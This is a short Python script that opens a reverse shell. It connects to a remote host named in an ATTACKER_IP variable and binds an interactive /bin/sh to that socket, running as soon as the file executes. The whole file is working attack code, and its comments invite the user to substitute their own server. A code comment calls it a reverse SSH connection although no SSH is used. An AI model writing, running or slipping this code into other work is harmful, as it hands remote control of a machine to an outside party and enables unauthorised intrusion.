import socket
import subprocess

# Replace with the new domain and port for the reverse SSH connection
ATTACKER_IP = "proxy16.rt3.io"  # Your new remote server
ATTACKER_PORT = 37294  # Port for your remote server (replace with the correct one)

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ATTACKER_IP, ATTACKER_PORT))  # Connect to the attacker's server
        # Redirect the socket to standard input, output, and error
        subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    except Exception as e:
        print(f"Connection failed: {e}")
        s.close()

reverse_shell()

